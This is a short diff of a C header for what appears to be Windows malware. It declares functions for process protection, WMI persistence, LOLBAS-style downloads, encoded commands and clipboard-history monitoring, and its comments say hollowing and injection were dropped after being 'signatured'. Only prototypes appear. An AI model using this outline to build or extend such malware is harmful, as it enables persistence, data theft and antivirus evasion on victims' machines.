@@ -97,15 +97,8 @@ void sys_unprotect_process(void);
 const char* sys_protection_status(void);
 const char* sys_check_critical_status_with_name(void);
 int sys_is_admin(void);
-void sys_deploy_services(void);
-void sys_wmi_persistence(void);
-/* REMOVED: process hollowing was signatured */
-/* REMOVED: process injection was signatured */
-void sys_harden_files(void);
-void sys_lolbas_download(const char *url, const char *outPath);
-char* sys_encode_cmd(const char *command);
+void sys_spawn_shadow_copy(void);
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam);
-void sys_cleanup(void);
 
 /* Clipboard */
 void copy_buffer_init(void);
@@ -115,7 +108,6 @@ char* copy_buffer_read_now(void);
 char* copy_buffer_get_history(void);
 DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam);
 void copy_buffer_debug_log(const char *fmt, ...);
-#include "../utils/util.h"
 
 /* === Security Audit === */
 char* config_scan_scan_system(void);
